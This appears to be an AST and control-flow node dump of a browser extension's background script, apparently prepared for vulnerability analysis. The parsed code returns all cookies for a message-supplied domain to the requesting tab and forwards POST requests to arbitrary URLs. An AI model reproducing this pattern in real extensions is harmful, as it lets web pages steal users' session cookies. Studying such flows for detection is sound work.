id:ID	labels:label	type	flags:string[]	lineno:int	code	childnum:int	funcid:int	classname	namespace	endlineno:int	name	doccomment
1982	AST	AST_SWITCH_CASE		387		4	1830		387:8:392:18	392		
1983	AST	string		387	"GETCOOKIE"	0	1830		387:13:387:24	387		
1984	AST	AST_STMT_LIST		387		1	1830		387:8:392:18	392		
1985	AST	AST_CALL		391	"GetIRCookie(a, b.tab.id)"	0	1830		391:12:391:36	391		"RequestQ.push(a);\\nDownloadData();\\nc({})"
1986	AST	AST_NAME	NAME_NOT_FQ	391		0	1830		391:12:391:36	391		
1987	AST	string		391	"GetIRCookie"	0	1830		391:12:391:23	391		
1988	AST	AST_ARG_LIST		391	"(a, b.tab.id)"	1	1830		391:12:391:36	391		
1989	AST	AST_VAR		391		0	1830		391:24:391:25	391		
1990	AST	string		391	"a"	0	1830		391:24:391:25	391	a	
1991	AST	AST_PROP		391	"b.tab.id"	1	1830		391:27:391:35	391		
1992	AST	AST_PROP		391	"b.tab"	0	1830		391:27:391:32	391		
1993	AST	AST_VAR		391		0	1830		391:27:391:28	391		
1994	AST	string		391	"b"	0	1830		391:27:391:28	391	b	
1995	AST	string		391	"tab"	1	1830		391:29:391:32	391		
1996	AST	string		391	"id"	1	1830		391:33:391:35	391		
1997	AST	AST_BREAK		392	"break;"	1	1830		392:12:392:18	392		
1998	AST	NULL		392		0	1830		392::392:			
1999	AST	AST_SWITCH_CASE		393		5	1830		393:8:399:18	399		
2000	AST	string		393	"GET_BLOB"	0	1830		393:13:393:23	393		
2001	AST	AST_STMT_LIST		393		1	1830		393:8:399:18	399		
2002	AST	AST_CALL		394		0	1830		394:12:397:14	397		
2003	AST	AST_NAME	NAME_NOT_FQ	394		0	1830		394:12:397:14	397		
2004	AST	string		394	"toDataUrl"	0	1830		394:12:394:21	394		
2005	AST	AST_ARG_LIST		394		1	1830		394:12:397:14	397		
2006	AST	AST_PROP		394	"a.URL"	0	1830		394:22:394:27	394		
2007	AST	AST_VAR		394		0	1830		394:22:394:23	394		
2008	AST	string		394	"a"	0	1830		394:22:394:23	394	a	
2009	AST	string		394	"URL"	1	1830		394:24:394:27	394		
2010	AST	AST_CLOSURE		394		1	1830		394:29:397:13	397		
2011	Artificial	CFG_FUNC_ENTRY					2010					
2012	Artificial	CFG_FUNC_EXIT					2010					
2013	AST	string		394	"{anon}"	0	2010		394::394:			
2014	AST	NULL		394		1	2010		394::394:			
2015	AST	AST_PARAM_LIST		394	"d"	2	2010		394:29:397:13	397		
2016	AST	AST_PARAM		394	"d"	0	2010		394::394:			
2017	AST	NULL		394	"any"	0	2010		394::394:			
2018	AST	string		394	"d"	1	2010		394:38:394:39	394		
2019	AST	NULL		394	"any"	2	2010		394::394:			
2020	AST	NULL		394		3	2010		394::394:			
2021	AST	AST_STMT_LIST		394		4	2010		394:41:397:13	397		
2022	AST	AST_ASSIGN		395	"a.Data = d"	0	2010		395:16:395:26	395		
2023	AST	AST_PROP		395	"a.Data"	0	2010		395:16:395:22	395		
2024	AST	AST_VAR		395		0	2010		395:16:395:17	395		
2025	AST	string		395	"a"	0	2010		395:16:395:17	395	a	
2026	AST	string		395	"Data"	1	2010		395:18:395:22	395		
2027	AST	AST_VAR		395		1	2010		395:25:395:26	395		
2028	AST	string		395	"d"	0	2010		395:25:395:26	395	d	
2029	AST	AST_CALL		396	"SendMessage(\"ONRESULT\", a, a.TabID)"	1	2010		396:16:396:51	396		
2030	AST	AST_NAME	NAME_NOT_FQ	396		0	2010		396:16:396:51	396		
2031	AST	string		396	"SendMessage"	0	2010		396:16:396:27	396		
2032	AST	AST_ARG_LIST		396	"(\"ONRESULT\", a, a.TabID)"	1	2010		396:16:396:51	396		
2033	AST	string		396	"ONRESULT"	0	2010		396:28:396:38	396		
2034	AST	AST_VAR		396		1	2010		396:40:396:41	396		
2035	AST	string		396	"a"	0	2010		396:40:396:41	396	a	
2036	AST	AST_PROP		396	"a.TabID"	2	2010		396:43:396:50	396		
2037	AST	AST_VAR		396		0	2010		396:43:396:44	396		
2038	AST	string		396	"a"	0	2010		396:43:396:44	396	a	
2039	AST	string		396	"TabID"	1	2010		396:45:396:50	396		
2040	AST	NULL		394		5	2010		394::394:			
2041	AST	NULL		394		6	2010		394::394:			
2042	AST	AST_CALL		398	"c({})"	1	1830		398:12:398:17	398		
2043	AST	AST_NAME	NAME_NOT_FQ	398		0	1830		398:12:398:17	398		
2044	AST	string		398	"c"	0	1830		398:12:398:13	398		
2045	AST	AST_ARG_LIST		398	"({})"	1	1830		398:12:398:17	398		
2046	AST	AST_ARRAY	JS_OBJECT	398		0	1830		398:14:398:16	398		
2047	AST	AST_BREAK		399	"break;"	2	1830		399:12:399:18	399		
2048	AST	NULL		399		0	1830		399::399:			
2049	AST	AST_SWITCH_CASE		400		6	1830		400:8:404:17	404		
2050	AST	NULL		400		0	1830		400::400:			
2051	AST	AST_STMT_LIST		400		1	1830		400:8:404:17	404		
2052	AST	AST_METHOD_CALL		402	"RequestQ.push(a)"	0	1830		402:12:402:28	402		"GetIRCookie(a, b.tab.id);"
2053	AST	AST_VAR		402		0	1830		402:12:402:20	402		
2054	AST	string		402	"RequestQ"	0	1830		402:12:402:20	402	RequestQ	
2055	AST	string		402	"push"	1	1830		402:21:402:25	402		
2056	AST	AST_ARG_LIST		402	"(a)"	2	1830		402:12:402:28	402		
2057	AST	AST_VAR		402		0	1830		402:26:402:27	402		
2058	AST	string		402	"a"	0	1830		402:26:402:27	402	a	
2059	AST	AST_CALL		403	"DownloadData()"	1	1830		403:12:403:26	403		
2060	AST	AST_NAME	NAME_NOT_FQ	403		0	1830		403:12:403:26	403		
2061	AST	string		403	"DownloadData"	0	1830		403:12:403:24	403		
2062	AST	AST_ARG_LIST		403	"()"	1	1830		403:12:403:26	403		
2063	AST	AST_CALL		404	"c({})"	2	1830		404:12:404:17	404		
2064	AST	AST_NAME	NAME_NOT_FQ	404		0	1830		404:12:404:17	404		
2065	AST	string		404	"c"	0	1830		404:12:404:13	404		
2066	AST	AST_ARG_LIST		404	"({})"	1	1830		404:12:404:17	404		
2067	AST	AST_ARRAY	JS_OBJECT	404		0	1830		404:14:404:16	404		
2068	AST	NULL		363		5	1830		363::363:			
2069	AST	NULL		363		6	1830		363::363:			
2070	AST	AST_FUNC_DECL		408	"toDataUrl"	48	2		408::420:1	420		
2071	Artificial	CFG_FUNC_ENTRY					2070					
2072	Artificial	CFG_FUNC_EXIT					2070					
2073	AST	string		408	"toDataUrl"	0	2070		408:9:408:18	408		
2074	AST	NULL		408		1	2070		408::408:			
2075	AST	AST_PARAM_LIST		408	"a, b"	2	2070		408::420:1	420		
2076	AST	AST_PARAM		408	"a"	0	2070		408::408:			
2077	AST	NULL		408	"any"	0	2070		408::408:			
2078	AST	string		408	"a"	1	2070		408:19:408:20	408		
2079	AST	NULL		408	"any"	2	2070		408::408:			
2080	AST	AST_PARAM		408	"b"	1	2070		408::408:			
2081	AST	NULL		408	"any"	0	2070		408::408:			
2082	AST	string		408	"b"	1	2070		408:22:408:23	408		
2083	AST	NULL		408	"any"	2	2070		408::408:			
2084	AST	AST_STMT_LIST		408		3	2070		408:25:420:1	420		
2085	AST	AST_ASSIGN		409	"c = new XMLHttpRequest"	0	2070		409:8:409:30	409		
2086	AST	AST_VAR	JS_DECL_VAR	409		0	2070		409:8:409:9	409		
2087	AST	string		409	"c"	0	2070		409:8:409:9	409	c	
2088	AST	AST_NEW		409	"new XMLHttpRequest"	1	2070		409:12:409:30	409		
2089	AST	AST_NAME	NAME_NOT_FQ	409		0	2070		409:12:409:30	409		
2090	AST	string		409	"XMLHttpRequest"	0	2070		409:16:409:30	409		
2091	AST	AST_ARG_LIST		409		1	2070		409:12:409:30	409		
2092	AST	AST_ASSIGN		410	"c.onload = function() {        var d = new FileReader;        d.onloadend = function() {            b(d.result)        };        d.readAsDataURL(c.response)    }"	1	2070		410:4:416:5	416		
2093	AST	AST_PROP		410	"c.onload"	0	2070		410:4:410:12	410		
2094	AST	AST_VAR		410		0	2070		410:4:410:5	410		
2095	AST	string		410	"c"	0	2070		410:4:410:5	410	c	
2096	AST	string		410	"onload"	1	2070		410:6:410:12	410		
2097	AST	AST_CLOSURE		410		1	2070		410:15:416:5	416		
2098	Artificial	CFG_FUNC_ENTRY					2097					
2099	Artificial	CFG_FUNC_EXIT					2097					
2100	AST	string		410	"{anon}"	0	2097		410::410:			
2101	AST	NULL		410		1	2097		410::410:			
2102	AST	AST_PARAM_LIST		410		2	2097		410:15:416:5	416		
2103	AST	NULL		410		3	2097		410::410:			
2104	AST	AST_STMT_LIST		410		4	2097		410:26:416:5	416		
2105	AST	AST_ASSIGN		411	"d = new FileReader"	0	2097		411:12:411:30	411		
2106	AST	AST_VAR	JS_DECL_VAR	411		0	2097		411:12:411:13	411		
2107	AST	string		411	"d"	0	2097		411:12:411:13	411	d	
2108	AST	AST_NEW		411	"new FileReader"	1	2097		411:16:411:30	411		
2109	AST	AST_NAME	NAME_NOT_FQ	411		0	2097		411:16:411:30	411		
2110	AST	string		411	"FileReader"	0	2097		411:20:411:30	411		
2111	AST	AST_ARG_LIST		411		1	2097		411:16:411:30	411		
2112	AST	AST_ASSIGN		412	"d.onloadend = function() {            b(d.result)        }"	1	2097		412:8:414:9	414		
2113	AST	AST_PROP		412	"d.onloadend"	0	2097		412:8:412:19	412		
2114	AST	AST_VAR		412		0	2097		412:8:412:9	412		
2115	AST	string		412	"d"	0	2097		412:8:412:9	412	d	
2116	AST	string		412	"onloadend"	1	2097		412:10:412:19	412		
2117	AST	AST_CLOSURE		412		1	2097		412:22:414:9	414		
2118	Artificial	CFG_FUNC_ENTRY					2117					
2119	Artificial	CFG_FUNC_EXIT					2117					
2120	AST	string		412	"{anon}"	0	2117		412::412:			
2121	AST	NULL		412		1	2117		412::412:			
2122	AST	AST_PARAM_LIST		412		2	2117		412:22:414:9	414		
2123	AST	NULL		412		3	2117		412::412:			
2124	AST	AST_STMT_LIST		412		4	2117		412:33:414:9	414		
2125	AST	AST_CALL		413	"b(d.result)"	0	2117		413:12:413:23	413		
2126	AST	AST_NAME	NAME_NOT_FQ	413		0	2117		413:12:413:23	413		
2127	AST	string		413	"b"	0	2117		413:12:413:13	413		
2128	AST	AST_ARG_LIST		413	"(d.result)"	1	2117		413:12:413:23	413		
2129	AST	AST_PROP		413	"d.result"	0	2117		413:14:413:22	413		
2130	AST	AST_VAR		413		0	2117		413:14:413:15	413		
2131	AST	string		413	"d"	0	2117		413:14:413:15	413	d	
2132	AST	string		413	"result"	1	2117		413:16:413:22	413		
2133	AST	NULL		412		5	2117		412::412:			
2134	AST	NULL		412		6	2117		412::412:			
2135	AST	AST_METHOD_CALL		415	"d.readAsDataURL(c.response)"	2	2097		415:8:415:35	415		
2136	AST	AST_VAR		415		0	2097		415:8:415:9	415		
2137	AST	string		415	"d"	0	2097		415:8:415:9	415	d	
2138	AST	string		415	"readAsDataURL"	1	2097		415:10:415:23	415		
2139	AST	AST_ARG_LIST		415	"(c.response)"	2	2097		415:8:415:35	415		
2140	AST	AST_PROP		415	"c.response"	0	2097		415:24:415:34	415		
2141	AST	AST_VAR		415		0	2097		415:24:415:25	415		
2142	AST	string		415	"c"	0	2097		415:24:415:25	415	c	
2143	AST	string		415	"response"	1	2097		415:26:415:34	415		
2144	AST	NULL		410		5	2097		410::410:			
2145	AST	NULL		410		6	2097		410::410:			
2146	AST	AST_METHOD_CALL		417	"c.open(\"GET\", a)"	2	2070		417:4:417:20	417		
2147	AST	AST_VAR		417		0	2070		417:4:417:5	417		
2148	AST	string		417	"c"	0	2070		417:4:417:5	417	c	
2149	AST	string		417	"open"	1	2070		417:6:417:10	417		
2150	AST	AST_ARG_LIST		417	"(\"GET\", a)"	2	2070		417:4:417:20	417		
2151	AST	string		417	"GET"	0	2070		417:11:417:16	417		
2152	AST	AST_VAR		417		1	2070		417:18:417:19	417		
2153	AST	string		417	"a"	0	2070		417:18:417:19	417	a	
2154	AST	AST_ASSIGN		418	"c.responseType = \"blob\""	3	2070		418:4:418:27	418		
2155	AST	AST_PROP		418	"c.responseType"	0	2070		418:4:418:18	418		
2156	AST	AST_VAR		418		0	2070		418:4:418:5	418		
2157	AST	string		418	"c"	0	2070		418:4:418:5	418	c	
2158	AST	string		418	"responseType"	1	2070		418:6:418:18	418		
2159	AST	string		418	"blob"	1	2070		418:21:418:27	418		
2160	AST	AST_METHOD_CALL		419	"c.send()"	4	2070		419:4:419:12	419		
2161	AST	AST_VAR		419		0	2070		419:4:419:5	419		
2162	AST	string		419	"c"	0	2070		419:4:419:5	419	c	
2163	AST	string		419	"send"	1	2070		419:6:419:10	419		
2164	AST	AST_ARG_LIST		419	"()"	2	2070		419:4:419:12	419		
2165	AST	NULL		408		4	2070		408::408:			
2166	AST	NULL		408		5	2070		408::408:			
2167	AST	AST_FUNC_DECL		422	"GetIRCookie"	49	2		422::439:1	439		
2168	Artificial	CFG_FUNC_ENTRY					2167					
2169	Artificial	CFG_FUNC_EXIT					2167					
2170	AST	string		422	"GetIRCookie"	0	2167		422:9:422:20	422		
2171	AST	NULL		422		1	2167		422::422:			
2172	AST	AST_PARAM_LIST		422	"a, b"	2	2167		422::439:1	439		
2173	AST	AST_PARAM		422	"a"	0	2167		422::422:			
2174	AST	NULL		422	"any"	0	2167		422::422:			
2175	AST	string		422	"a"	1	2167		422:21:422:22	422		
2176	AST	NULL		422	"any"	2	2167		422::422:			
2177	AST	AST_PARAM		422	"b"	1	2167		422::422:			
2178	AST	NULL		422	"any"	0	2167		422::422:			
2179	AST	string		422	"b"	1	2167		422:24:422:25	422		
2180	AST	NULL		422	"any"	2	2167		422::422:			
2181	AST	AST_STMT_LIST		422		3	2167		422:27:439:1	439		
2182	AST	AST_METHOD_CALL		423		0	2167		423:4:438:6	438		
2183	AST	AST_PROP		423	"chrome.cookies"	0	2167		423:4:423:18	423		
2184	AST	AST_VAR		423		0	2167		423:4:423:10	423		
2185	AST	string		423	"chrome"	0	2167		423:4:423:10	423	chrome	
2186	AST	string		423	"cookies"	1	2167		423:11:423:18	423		
2187	AST	string		423	"getAll"	1	2167		423:19:423:25	423		
2188	AST	AST_ARG_LIST		423		2	2167		423:4:438:6	438		
2189	AST	AST_ARRAY	JS_OBJECT	423		0	2167		423:26:425:5	425		
2190	AST	AST_ARRAY_ELEM		424		0	2167		424:8:424:28	424		
2191	AST	AST_PROP		424	"plugdata.URL"	0	2167		424:16:424:28	424		
2192	AST	AST_VAR		424		0	2167		424:16:424:24	424		
2193	AST	string		424	"plugdata"	0	2167		424:16:424:24	424	plugdata	
2194	AST	string		424	"URL"	1	2167		424:25:424:28	424		
2195	AST	string		424	"domain"	1	2167		424:8:424:14	424		
2196	AST	AST_CLOSURE		425		1	2167		425:7:438:5	438		
2197	Artificial	CFG_FUNC_ENTRY					2196					
2198	Artificial	CFG_FUNC_EXIT					2196					
2199	AST	string		425	"{anon}"	0	2196		425::425:			
2200	AST	NULL		425		1	2196		425::425:			
2201	AST	AST_PARAM_LIST		425	"c"	2	2196		425:7:438:5	438		
2202	AST	AST_PARAM		425	"c"	0	2196		425::425:			
2203	AST	NULL		425	"any"	0	2196		425::425:			
2204	AST	string		425	"c"	1	2196		425:16:425:17	425		
2205	AST	NULL		425	"any"	2	2196		425::425:			
2206	AST	NULL		425		3	2196		425::425:			
2207	AST	AST_STMT_LIST		425		4	2196		425:19:438:5	438		
2208	AST	AST_ASSIGN		426	"d = []"	0	2196		426:12:426:18	426		
2209	AST	AST_VAR	JS_DECL_VAR	426		0	2196		426:12:426:13	426		
2210	AST	string		426	"d"	0	2196		426:12:426:13	426	d	
2211	AST	AST_ARRAY	JS_ARRAY	426	"[]"	1	2196		426:16:426:18	426		
2212	AST	AST_METHOD_CALL		427		1	2196		427:8:435:10	435		
2213	AST	AST_CALL		427	"$(c)"	0	2196		427:8:427:12	427		
2214	AST	AST_NAME	NAME_NOT_FQ	427		0	2196		427:8:427:12	427		
2215	AST	string		427	"$"	0	2196		427:8:427:9	427		
2216	AST	AST_ARG_LIST		427	"(c)"	1	2196		427:8:427:12	427		
2217	AST	AST_VAR		427		0	2196		427:10:427:11	427		
2218	AST	string		427	"c"	0	2196		427:10:427:11	427	c	
2219	AST	string		427	"each"	1	2196		427:13:427:17	427		
2220	AST	AST_ARG_LIST		427		2	2196		427:8:435:10	435		
2221	AST	AST_CLOSURE		427		0	2196		427:18:435:9	435		
2222	Artificial	CFG_FUNC_ENTRY					2221					
2223	Artificial	CFG_FUNC_EXIT					2221					
2224	AST	string		427	"{anon}"	0	2221		427::427:			
2225	AST	NULL		427		1	2221		427::427:			
2226	AST	AST_PARAM_LIST		427		2	2221		427:18:435:9	435		
2227	AST	NULL		427		3	2221		427::427:			
2228	AST	AST_STMT_LIST		427		4	2221		427:29:435:9	435		
2229	AST	AST_METHOD_CALL		428		0	2221		428:12:434:14	434		
2230	AST	AST_VAR		428		0	2221		428:12:428:13	428		
2231	AST	string		428	"d"	0	2221		428:12:428:13	428	d	
2232	AST	string		428	"push"	1	2221		428:14:428:18	428		
2233	AST	AST_ARG_LIST		428	"({                name: this.name,                value: this.value,                domain: this.domain,                secure: this.secure,                path: this.path            })"	2	2221		428:12:434:14	434		
2234	AST	AST_ARRAY	JS_OBJECT	428		0	2221		428:19:434:13	434		
2235	AST	AST_ARRAY_ELEM		429		0	2221		429:16:429:31	429		
2236	AST	AST_PROP		429	"this.name"	0	2221		429:22:429:31	429		
2237	AST	AST_VAR		429		0	2221		429:22:429:26	429		
2238	AST	string		429	"this"	0	2221		429:22:429:26	429	this	
2239	AST	string		429	"name"	1	2221		429:27:429:31	429		
2240	AST	string		429	"name"	1	2221		429:16:429:20	429		
2241	AST	AST_ARRAY_ELEM		430		1	2221		430:16:430:33	430		
2242	AST	AST_PROP		430	"this.value"	0	2221		430:23:430:33	430		
2243	AST	AST_VAR		430		0	2221		430:23:430:27	430		
2244	AST	string		430	"this"	0	2221		430:23:430:27	430	this	
2245	AST	string		430	"value"	1	2221		430:28:430:33	430		
2246	AST	string		430	"value"	1	2221		430:16:430:21	430		
2247	AST	AST_ARRAY_ELEM		431		2	2221		431:16:431:35	431		
2248	AST	AST_PROP		431	"this.domain"	0	2221		431:24:431:35	431		
2249	AST	AST_VAR		431		0	2221		431:24:431:28	431		
2250	AST	string		431	"this"	0	2221		431:24:431:28	431	this	
2251	AST	string		431	"domain"	1	2221		431:29:431:35	431		
2252	AST	string		431	"domain"	1	2221		431:16:431:22	431		
2253	AST	AST_ARRAY_ELEM		432		3	2221		432:16:432:35	432		
2254	AST	AST_PROP		432	"this.secure"	0	2221		432:24:432:35	432		
2255	AST	AST_VAR		432		0	2221		432:24:432:28	432		
2256	AST	string		432	"this"	0	2221		432:24:432:28	432	this	
2257	AST	string		432	"secure"	1	2221		432:29:432:35	432		
2258	AST	string		432	"secure"	1	2221		432:16:432:22	432		
2259	AST	AST_ARRAY_ELEM		433		4	2221		433:16:433:31	433		
2260	AST	AST_PROP		433	"this.path"	0	2221		433:22:433:31	433		
2261	AST	AST_VAR		433		0	2221		433:22:433:26	433		
2262	AST	string		433	"this"	0	2221		433:22:433:26	433	this	
2263	AST	string		433	"path"	1	2221		433:27:433:31	433		
2264	AST	string		433	"path"	1	2221		433:16:433:20	433		
2265	AST	NULL		427		5	2221		427::427:			
2266	AST	NULL		427		6	2221		427::427:			
2267	AST	AST_ASSIGN		436	"a.Data = JSON.stringify(d)"	2	2196		436:8:436:34	436		
2268	AST	AST_PROP		436	"a.Data"	0	2196		436:8:436:14	436		
2269	AST	AST_VAR		436		0	2196		436:8:436:9	436		
2270	AST	string		436	"a"	0	2196		436:8:436:9	436	a	
2271	AST	string		436	"Data"	1	2196		436:10:436:14	436		
2272	AST	AST_METHOD_CALL		436	"JSON.stringify(d)"	1	2196		436:17:436:34	436		
2273	AST	AST_VAR		436		0	2196		436:17:436:21	436		
2274	AST	string		436	"JSON"	0	2196		436:17:436:21	436	JSON	
2275	AST	string		436	"stringify"	1	2196		436:22:436:31	436		
2276	AST	AST_ARG_LIST		436	"(d)"	2	2196		436:17:436:34	436		
2277	AST	AST_VAR		436		0	2196		436:32:436:33	436		
2278	AST	string		436	"d"	0	2196		436:32:436:33	436	d	
2279	AST	AST_CALL		437	"SendMessage(\"ONRESULT\", a, b)"	3	2196		437:8:437:37	437		
2280	AST	AST_NAME	NAME_NOT_FQ	437		0	2196		437:8:437:37	437		
2281	AST	string		437	"SendMessage"	0	2196		437:8:437:19	437		
2282	AST	AST_ARG_LIST		437	"(\"ONRESULT\", a, b)"	1	2196		437:8:437:37	437		
2283	AST	string		437	"ONRESULT"	0	2196		437:20:437:30	437		
2284	AST	AST_VAR		437		1	2196		437:32:437:33	437		
2285	AST	string		437	"a"	0	2196		437:32:437:33	437	a	
2286	AST	AST_VAR		437		2	2196		437:35:437:36	437		
2287	AST	string		437	"b"	0	2196		437:35:437:36	437	b	
2288	AST	NULL		425		5	2196		425::425:			
2289	AST	NULL		425		6	2196		425::425:			
2290	AST	NULL		422		4	2167		422::422:			
2291	AST	NULL		422		5	2167		422::422:			
2292	AST	AST_FUNC_DECL		441	"DownloadData"	50	2		441::457:1	457		
2293	Artificial	CFG_FUNC_ENTRY					2292					
2294	Artificial	CFG_FUNC_EXIT					2292					
2295	AST	string		441	"DownloadData"	0	2292		441:9:441:21	441		
2296	AST	NULL		441		1	2292		441::441:			
2297	AST	AST_PARAM_LIST		441		2	2292		441::457:1	457		
2298	AST	AST_STMT_LIST		441		3	2292		441:24:457:1	457		
2299	AST	AST_IF		442		0	2292		442:4:456:5	456		
2300	AST	AST_IF_ELEM		442		0	2292		442:4:456:5	456		
2301	AST	AST_BINARY_OP	BINARY_IS_NOT_EQUAL	442	"RequestQ.length != 0"	0	2292		442:8:442:28	442		
2302	AST	AST_PROP		442	"RequestQ.length"	0	2292		442:8:442:23	442		
2303	AST	AST_VAR		442		0	2292		442:8:442:16	442		
2304	AST	string		442	"RequestQ"	0	2292		442:8:442:16	442	RequestQ	
2305	AST	string		442	"length"	1	2292		442:17:442:23	442		
2306	AST	integer		442	"0"	1	2292		442:27:442:28	442		
2307	AST	AST_STMT_LIST		442		1	2292		442:30:456:5	456		
2308	AST	AST_ASSIGN		443	"a = RequestQ[0]"	0	2292		443:12:443:27	443		
2309	AST	AST_VAR	JS_DECL_VAR	443		0	2292		443:12:443:13	443		
2310	AST	string		443	"a"	0	2292		443:12:443:13	443	a	
2311	AST	AST_DIM		443	"RequestQ[0]"	1	2292		443:16:443:27	443		
2312	AST	AST_VAR		443		0	2292		443:16:443:24	443		
2313	AST	string		443	"RequestQ"	0	2292		443:16:443:24	443	RequestQ	
2314	AST	integer		443	"0"	1	2292		443:25:443:26	443		
2315	AST	AST_ASSIGN		444	"plugdata = a"	1	2292		444:8:444:20	444		
2316	AST	AST_VAR		444		0	2292		444:8:444:16	444		
2317	AST	string		444	"plugdata"	0	2292		444:8:444:16	444	plugdata	
2318	AST	AST_VAR		444		1	2292		444:19:444:20	444		
2319	AST	string		444	"a"	0	2292		444:19:444:20	444	a	
2320	AST	AST_CONDITIONAL		445	"a.Method == \"GET\" ? x = x+1: $.post(a.URL,  a.post, function(b) {            a.Data = b;            if (typeof b === \"string\") a.Data = b.replace(/<img .*?>/g, \"\").replace(/<form .*?>/g, \"<form action=''>\").replace(/<FORM .*?>/g, \"<form action=''>\");            SendMessage(\"ONRESULT\", a, a.TabID);            // DownloadData()        }).fail(function() {            a.Data = \"Error\";            SendMessage(\"ONRESULT\", a, a.TabID);            // DownloadData()        }).always(function() {})"	2	2292		445:8:454:32	454		
2321	AST	AST_BINARY_OP	BINARY_IS_EQUAL	445	"a.Method == \"GET\""	0	2292		445:8:445:25	445		
2322	AST	AST_PROP		445	"a.Method"	0	2292		445:8:445:16	445		
2323	AST	AST_VAR		445		0	2292		445:8:445:9	445		
2324	AST	string		445	"a"	0	2292		445:8:445:9	445	a	
2325	AST	string		445	"Method"	1	2292		445:10:445:16	445		
2326	AST	string		445	"GET"	1	2292		445:20:445:25	445		
2327	AST	AST_ASSIGN		445	"x = x+1"	1	2292		445:28:445:35	445		
2328	AST	AST_VAR		445		0	2292		445:28:445:29	445		
2329	AST	string		445	"x"	0	2292		445:28:445:29	445	x	
2330	AST	AST_BINARY_OP	BINARY_ADD	445	"x+1"	1	2292		445:32:445:35	445		
2331	AST	AST_VAR		445		0	2292		445:32:445:33	445		
2332	AST	string		445	"x"	0	2292		445:32:445:33	445	x	
2333	AST	integer		445	"1"	1	2292		445:34:445:35	445		
2334	AST	AST_METHOD_CALL		445		2	2292		445:37:454:32	454		
2335	AST	AST_METHOD_CALL		445		0	2292		445:37:454:10	454		
2336	AST	AST_METHOD_CALL		445		0	2292		445:37:450:10	450		
2337	AST	AST_VAR		445		0	2292		445:37:445:38	445		
2338	AST	string		445	"$"	0	2292		445:37:445:38	445	$	
2339	AST	string		445	"post"	1	2292		445:39:445:43	445		
2340	AST	AST_ARG_LIST		445		2	2292		445:37:450:10	450		
2341	AST	AST_PROP		445	"a.URL"	0	2292		445:44:445:49	445		
2342	AST	AST_VAR		445		0	2292		445:44:445:45	445		
2343	AST	string		445	"a"	0	2292		445:44:445:45	445	a	
2344	AST	string		445	"URL"	1	2292		445:46:445:49	445		
2345	AST	AST_PROP		445	"a.post"	1	2292		445:52:445:58	445		
2346	AST	AST_VAR		445		0	2292		445:52:445:53	445		
2347	AST	string		445	"a"	0	2292		445:52:445:53	445	a	
2348	AST	string		445	"post"	1	2292		445:54:445:58	445		
2349	AST	AST_CLOSURE		445		2	2292		445:60:450:9	450		
2350	Artificial	CFG_FUNC_ENTRY					2349					
2351	Artificial	CFG_FUNC_EXIT					2349					
2352	AST	string		445	"{anon}"	0	2349		445::445:			
2353	AST	NULL		445		1	2349		445::445:			
2354	AST	AST_PARAM_LIST		445	"b"	2	2349		445:60:450:9	450		
2355	AST	AST_PARAM		445	"b"	0	2349		445::445:			
2356	AST	NULL		445	"any"	0	2349		445::445:			
2357	AST	string		445	"b"	1	2349		445:69:445:70	445		
2358	AST	NULL		445	"any"	2	2349		445::445:			
2359	AST	NULL		445		3	2349		445::445:			
2360	AST	AST_STMT_LIST		445		4	2349		445:72:450:9	450		
2361	AST	AST_ASSIGN		446	"a.Data = b"	0	2349		446:12:446:22	446		
2362	AST	AST_PROP		446	"a.Data"	0	2349		446:12:446:18	446		
2363	AST	AST_VAR		446		0	2349		446:12:446:13	446		
2364	AST	string		446	"a"	0	2349		446:12:446:13	446	a	
2365	AST	string		446	"Data"	1	2349		446:14:446:18	446		
2366	AST	AST_VAR		446		1	2349		446:21:446:22	446		
2367	AST	string		446	"b"	0	2349		446:21:446:22	446	b	
2368	AST	AST_IF		447		1	2349		447:12:447:162	447		
2369	AST	AST_IF_ELEM		447		0	2349		447:12:447:162	447		
2370	AST	AST_BINARY_OP	BINARY_IS_IDENTICAL	447	"typeof b === \"string\""	0	2349		447:16:447:37	447		
2371	AST	AST_CALL	JS_TYPEOF	447	"typeof b"	0	2349		447:16:447:24	447		
2372	AST	AST_NAME	NAME_NOT_FQ	447		0	2349		447:16:447:24	447		
2373	AST	string		447	"gettype"	0	2349		447:16:447:24	447		
2374	AST	AST_ARG_LIST		447		1	2349		447:16:447:24	447		
2375	AST	AST_VAR		447		0	2349		447:23:447:24	447		
2376	AST	string		447	"b"	0	2349		447:23:447:24	447	b	
2377	AST	string		447	"string"	1	2349		447:29:447:37	447		
2378	AST	AST_STMT_LIST		447		1	2349		447:39:447:162	447		
2379	AST	AST_ASSIGN		447	"a.Data = b.replace(/<img .*?>/g, \"\").replace(/<form .*?>/g, \"<form action=''>\").replace(/<FORM .*?>/g, \"<form action=''>\")"	0	2349		447:39:447:161	447		
